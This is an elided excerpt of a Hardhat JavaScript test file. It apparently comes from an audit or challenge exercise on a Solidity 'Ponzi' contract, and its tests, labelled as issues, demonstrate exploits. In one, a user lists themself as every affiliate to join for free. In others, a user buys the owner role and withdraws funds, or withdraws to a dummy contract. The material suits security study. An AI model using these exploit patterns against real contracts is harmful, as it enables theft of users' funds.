...
describe.only(NAME, function () {
    ...
    beforeEach(async function () {
        [deployer, affiliate_1, affiliate_2, affiliate_3, user] = await ethers.getSigners();

        ponziContract = await (await ethers.getContractFactory(NAME, deployer)).deploy();
        ...
        await ponziContract.connect(affiliate_3)
            .joinPonzi([affiliate_1.address, affiliate_2.address],{value: ethers.parseEther('2')});
    });
    ...
    */
    it('CriticalIssue1', async function () {
        ...
        await ponziContract.connect(user)
            .joinPonzi([user.address, user.address, user.address], {value: ethers.parseEther('3')});

        const balanceAfter = await ethers.provider.getBalance(user.address);

        // Balance for user not changed after joining Ponzi
        expect(balanceBefore - balanceAfter).to.be.closeTo(0, ethers.parseEther('0.001'));
    });
    ...
    */
    it('CriticalIssue2', async function () {
        ...
        await ponziContract.connect(user).buyOwnerRole(user.address, {value: ethers.parseEther('10')});
        await ponziContract.connect(user).ownerWithdraw(user.address, ethers.parseEther('10'));
    ...
    */
    it('Issue3', async function () {
        ...
        await ponziContract.connect(user).ownerWithdraw(dummyContract, ethers.parseEther('5'));
